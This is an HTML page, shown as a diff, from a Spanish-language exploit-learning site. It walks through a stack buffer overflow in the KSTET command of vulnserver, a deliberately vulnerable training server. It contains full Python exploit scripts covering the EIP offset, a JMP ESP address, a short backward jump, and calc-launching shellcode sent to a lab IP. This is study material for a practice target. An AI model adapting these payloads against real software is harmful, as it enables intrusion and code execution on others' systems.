@@ -1,0 +1,233 @@
+
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/al_zo_ex.css">
+
+ 
+	<title>vulnserver - windows</title>
+</head>
+<body>
+
+<header>
+
+  <nav class="navbar navbar-expand-md navbar-light shadow-5-strong">
+      <div class="container-fluid">
+        <a class="navbar-brand text-primary" href="secur-home.html">learn@hacks#</a>
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#submenus" aria-controls="submenus" aria-expanded="false" arial-label="Toggler navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse justify-content-md-center" id="submenus">
+          <ul class="navbar-nav">
+            
+            <li class="nav-item active"><a class="nav-link text-primary" href="secur-home.html">Inicio</a></li>
+            <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle text-primary" href="#" data-bs-toggle="dropdown">Exploit Education</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofExEducation.html">Phoenix</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofNbEducation.html">Nebula</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="proofFsEducation.html">Fusion</a></li>
+                </ul>
+            </li>
+
+            <li class="nav-item dropdown">
+          <a class="nav-link dropdown-toggle text-primary" data-bs-toggle="dropdown" href="#">CTFs</a>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item nav-link text-primary" href="proofVlhub.html">Vulnhub</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="picoFlags.html">picoCTF</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="RPISEC_MBE.html">RPISEC</a></li>
+                    <li><a class="dropdown-item nav-link text-primary" href="pwnable_kr.html">pwnable</a></li>
+        </ul>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="shlpage.html">Shellcodes</a>
+            </li>
+
+            <li class="nav-item ">
+                <a class="nav-link text-primary nav-link-color" href="tutoriales.html">Tutoriales</a>
+            </li> 
+
+            <li class="nav-item">
+              <a class="nav-link text-primary nav-link-color" href="https://github.com/BGPavelAng">Github</a>
+            </li>
+
+            <li>
+              <a class="nav-link text-primary nav-link-color" href="https://www.patreon.com/BGPavelAng">Patreon</a>
+            </li>
+
+          </ul>
+        </div>
+    </div>
+  </nav>
+</header>
+
+<div class="container-fluid">
+    <div class="row">
+      <div class="col">
+        <div class="img-bran d-none d-md-none d-lg-block">
+          
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container mt-5">
+    <div class="row mt-5">
+      <div class="col">
+
+            <p><b>Vamos a explotar la vulnerabilidad de KSTET</b></p>
+            
+            
+            
+<p>Primero vamos a revisar como ejecutar la función.</p>
+
+<p>Usaremos Immunity y busquemos en "Search for -> All referenced text strings" y damos click sobre KSTET.</p>
+
+<img class="img-fluid" src="vid/kstet_1.png"><br><br>
+
+<p>Podemos ver que hace un strncpy con KSTET y después hay un malloc con un espacio de 64 bytes, pero hagamos un pattern_create con mona y verifiquemos.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+import socket<br>
+import struct<br><br>
+
+basura = b"A"*69<br>
+basura += b"BBBB"<br><br>
+
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+soc.connect(('192.168.0.9', 9999))<br><br>
+
+
+
+soc.send((b"KSTET /" + basura))<br><br>
+
+soc.close()<br><br>
+
+  
+</p>
+
+<img class="img-fluid" src="vid/kstet_2.png"><br><br>
+
+<p>Pues al parecer con 69 bytes rellena la pila y 4 bytes más sobre escribe EIP. Ahora busquemos un jmp ESP con mona para lograr meter una shell ahí.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+  import socket<br>
+  import struct<br><br>
+  
+  basura = b"A"*69<br>
+  padd = b"D"*1000<br><br>
+  
+  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+  soc.connect(('192.168.0.9', 9999))<br><br>
+  
+  eip = struct.pack("I", 0x625011af)<br><br>
+  
+  enviar = basura + eip + padd<br><br>
+  
+  soc.send((b"KSTET /" + enviar))<br><br>
+  
+  soc.close()<br><br>
+
+  
+</p>
+
+<p>Primero, colocamos un break en el JMP ESP para ver que pasa y vamos avanzando.</p>
+
+<img class="img-fluid" src="vid/kstet_3.png"><br><br>
+<img class="img-fluid" src="vid/kstet_4.png"><br><br>
+
+<p>Aquí estamos en el padd, y más arriba podemos ver como la basura rellena la memoria. Pero hay un problema, el espacio es muy pequeño incluso para un egghunter, así que hagamos un truco que podría funcionar en algunos casos.</p>
+
+<p>Vamos a ejecutar un jump que vaya hacia arriba, osea, al inicio de basura donde hay más espacio.</p>
+
+<p>Para eso copiamos la dirección del inicio de 0x41, después con Assemble colocamos, JMP + dirección copiada y nos dará el short jump junto con la cantidad de bytes necesarios para llegar.</p>
+
+<img class="img-fluid" src="vid/kstet_5.png"><br><br>
+<img class="img-fluid" src="vid/kstet_6.png"><br><br>
+
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+import socket<br>
+import struct<br><br>
+
+basura = b"A"*69<br>
+jmp_atras = b"\xeb\xb5\x90\x90"<br>
+padd = b"D"*1000<br><br>
+
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+soc.connect(('192.168.0.9', 9999))<br><br>
+
+eip = struct.pack("I", 0x625011af)<br><br>
+
+enviar = basura + eip + jmp_atras + padd<br><br>
+
+soc.send((b"KSTET /" + enviar))<br><br>
+
+soc.close()<br><br>
+
+</p>
+
+
+<p>Listo, podemos ver que salta al inicio de 0x41 además también podemos ver que no es necesario los nops "x90".</p>
+
+<img class="img-fluid" src="vid/kstet_7.png"><br><br>
+
+<p>Ahora coloquemos una shell para que salte la calculadora y si todo va bien, funcionará.</p>
+
+<p style="padding: 10px; border: 2px solid red; background-color: rgba(255, 204, 204, 0.3);">
+
+import socket<br>
+import struct<br><br>
+
+shellcode = b"\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe0\x41\x51"<br>
+shellcode += b"\x50\xbb\x10\x55\x5c\x76\xff\xd3\x31\xc0\x50\xb8\x40\x76\x58\x76\xff\xd0"<br><br>
+
+
+basura = b"A" * (69 - len(shellcode))<br>
+jmp_atras = b"\xeb\xb5"<br>
+padd = b"D"*1000<br><br>
+
+soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+soc.connect(('192.168.0.9', 9999))<br><br>
+
+eip = struct.pack("I", 0x625011af)<br><br>
+
+enviar = shellcode + basura + eip + jmp_atras + padd<br><br>
+
+soc.send((b"KSTET /" + enviar))<br><br>
+
+soc.close()<br><br>
+  
+</p>
+
+
+<p>Recordemos que en los 69 bytes tenemos que meter la shell, así que reducimos la basura por la shell, incluso sería bueno eliminar unos 4 bytes para meter unos nop's al inicio, pero ahora no es necesario, así de simple esta bien.</p>
+
+<img class="img-fluid" src="vid/kstet_8.png"><br><br>
+
+<p>Listo, pasamos la prueba KSTET </p>
+
+      
+</div>
+
+    </div>
+  </div>
+  <footer class=" footer bg-light">
+    <div class="container-fluid mt-3">
+      <p class="mt-2">Aprende algo nuevo todos los días. Good luck!</p>
+    </div>
+  </footer>
+
+   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
+      
